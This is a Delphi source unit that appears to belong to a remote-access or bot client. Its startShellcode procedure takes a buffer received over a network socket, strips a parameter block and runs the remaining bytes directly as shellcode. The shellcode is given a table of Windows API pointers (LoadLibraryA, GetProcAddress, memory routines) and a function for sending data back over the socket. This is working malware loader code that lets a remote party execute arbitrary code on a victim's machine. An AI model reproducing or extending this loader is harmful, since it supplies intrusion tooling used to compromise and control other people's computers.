unit untUtils;
interface
uses
  Windows;
type
  xGetProcAddress = function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
  xLoadLibrary = function(strLib:PChar): HMODULE; stdcall;
  xGetMemory = function(dwLen:Integer):Pointer;
  xFreeMemory = procedure(ptrMemory:Pointer);
  xCopyMemory = procedure(pDestiny, pSource:Pointer; dwLen:Integer);
  xZeroMemory = procedure(Destination: Pointer; Length: DWORD);
  xwsprintfA = function (lpOut: PChar; lpFmt: PChar; lpVars: Array of Const):Integer;
  xSendBuffer = function (hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
  xMessageBox = function(hWnd: HWND; lpText, lpCaption: PChar; uType: UINT): Integer; stdcall;

type
  TAPIBlock = record
    hSocket:            Cardinal;
    hKernelHandle:      Cardinal;
    pGetProcAddress:    xGetProcAddress;
    pLoadLibraryA:      xLoadLibrary;
    pGetMemory:         xGetMemory;
    pFreeMemory:        xFreeMemory;
    pCopyMemory:        xCopyMemory;
    pZeroMemory:        xZeroMemory;
    pwsprintfA:         xwsprintfA;
    pSendBuffer:        xSendBuffer;
    pMessageBox:        xMessageBox;
  end;
  PAPIBlock = ^TAPIBlock;

type
  TShellCodeFunc = procedure (ptrData:Pointer; dwLen:Integer; ptrAPIBlock:PAPIBlock); stdcall;
  PShellCodeFunc = ^TShellCodeFunc;
  
procedure Log(strMessage:PChar);
procedure startShellcode(hMainSock:Cardinal; ptrData:Pointer; dwLen:Cardinal);
procedure SendInformation(hSocket:Integer);

implementation

uses
  untConnection;

function _wsprintf(lpOut: PChar; lpFmt: PChar; lpVars: Array of Const):
Integer; assembler;
var
  Count: integer;
  v1, v2: integer;
asm
  mov v1, eax
  mov v2, edx
  mov eax, ecx { data pointer }
  mov ecx, [ebp+$08] { count }
  inc ecx
  mov Count, ecx
  { Make ebx point to last entry in lpVars }
  dec ecx
  imul ecx, 8
  add eax, ecx
  mov ecx, Count
@@1:
  mov edx, [eax]
  push edx
  sub eax, 8
  loop @@1

  push v2
  push v1

  call wsprintf

  { clean up stack }
  mov ecx, Count
  imul ecx, 4
  add ecx, 8
  add esp, ecx
end; 
  
procedure Log(strMessage:PChar);
begin
  {$IFDEF DEBUG}
    OutputDebugString(strMessage);
  {$ENDIF}
end;

procedure SendInformation(hSocket:Integer);
const
  compname = ' TEST NOW';
begin
  SendBuffer(hSocket, 0, @compname[2], Length(compname));
end;

procedure startShellcode(hMainSock:Cardinal; ptrData:Pointer; dwLen:Cardinal);
const
  strMessage = ' HELLO MAN';
var
  tlbAPIBlock:TAPIBlock;
  tlbShellCode:TShellCodeFunc;
  dwParamLen:Cardinal;
  pData:PChar;
begin
  CopyMemory(@dwParamLen, ptrData, 4);
  pData := nil;
  if dwParamLen > 0 then
  begin
    pData := AllocMem(dwParamLen);
    if pData <> nil then
      CopyMemory(pData, Pointer(Cardinal(ptrData) + 4), dwParamLen);
  end;
  inc(PByte(ptrData), 4);
  inc(PByte(ptrData), dwParamLen);
  tlbShellCode := ptrData;
  with tlbAPIBlock do
  begin
    hKernelHandle := GetModuleHandleA('kernel32.dll');
    hSocket := hMainSock;
    pZeroMemory := @ZeroMemory;
    pwsprintfA := @Windows.wsprintfA;
    pLoadLibraryA := @Windows.LoadLibraryA;
    pGetProcAddress := @Windows.GetProcAddress;
    pSendBuffer := @SendBuffer;
    pMessageBox := @MessageBoxA;
    pGetMemory := @AllocMem;
    pFreeMemory := @FreeMem;
  end;
  tlbShellCode(pData, dwParamLen, @tlbAPIBlock);
end;
end.
